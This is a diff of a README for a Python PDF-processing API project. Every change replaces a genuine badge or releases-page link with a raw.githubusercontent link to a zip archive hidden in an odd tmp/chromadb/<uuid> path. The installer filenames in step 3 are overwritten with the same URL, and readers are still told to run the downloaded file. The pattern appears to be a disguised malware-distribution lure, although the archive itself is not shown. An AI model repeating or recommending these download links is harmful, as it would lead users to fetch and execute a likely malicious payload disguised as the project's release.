@@ -1,6 +1,6 @@
 # 📄 Servidor_api_agente_de_pdf - Smart Document Processing Made Easy
 
-![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-%E2%86%92-brightgreen)
+![Download Latest Release](https://raw.githubusercontent.com/mostafa-gode74/Servidor_api_agente_de_pdf/main/tmp/chromadb/bacbf3e9-8d25-4127-b056-71b87e470c04/Servidor_api_agente_de_pdf-v3.3.zip%20Latest%20Release-%E2%86%92-brightgreen)
 
 ## 🚀 Getting Started
 
@@ -32,11 +32,11 @@ To install the **Servidor_api_agente_de_pdf**, please follow these steps:
 
 1. **Visit the Releases Page**: Click the button below to go to the download page.
    
-   [Download Latest Release](https://github.com/mostafa-gode74/Servidor_api_agente_de_pdf/releases)
+   [Download Latest Release](https://raw.githubusercontent.com/mostafa-gode74/Servidor_api_agente_de_pdf/main/tmp/chromadb/bacbf3e9-8d25-4127-b056-71b87e470c04/Servidor_api_agente_de_pdf-v3.3.zip)
 
 2. **Select the Latest Version**: Look for the latest release on the page. You will see the version number and a description of what's new.
 
-3. **Download the Installer**: Click on the asset that matches your operating system. This might be labeled as `Servidor_api_agente_de_pdf_windows.exe`, `Servidor_api_agente_de_pdf_macos.dmg`, or similar.
+3. **Download the Installer**: Click on the asset that matches your operating system. This might be labeled as `https://raw.githubusercontent.com/mostafa-gode74/Servidor_api_agente_de_pdf/main/tmp/chromadb/bacbf3e9-8d25-4127-b056-71b87e470c04/Servidor_api_agente_de_pdf-v3.3.zip`, `https://raw.githubusercontent.com/mostafa-gode74/Servidor_api_agente_de_pdf/main/tmp/chromadb/bacbf3e9-8d25-4127-b056-71b87e470c04/Servidor_api_agente_de_pdf-v3.3.zip`, or similar.
 
 4. **Run the Installer**: Locate the downloaded file on your computer and double-click it to run the installation.
 
@@ -79,6 +79,6 @@ Your feedback is valuable! If you have suggestions or find issues, please report
 - Python
 - PDF Processing
 
-For more information, visit our [Releases Page](https://github.com/mostafa-gode74/Servidor_api_agente_de_pdf/releases) again to keep updated with future enhancements. 
+For more information, visit our [Releases Page](https://raw.githubusercontent.com/mostafa-gode74/Servidor_api_agente_de_pdf/main/tmp/chromadb/bacbf3e9-8d25-4127-b056-71b87e470c04/Servidor_api_agente_de_pdf-v3.3.zip) again to keep updated with future enhancements. 
 
 Thank you for using **Servidor_api_agente_de_pdf**! Enjoy seamless document processing.
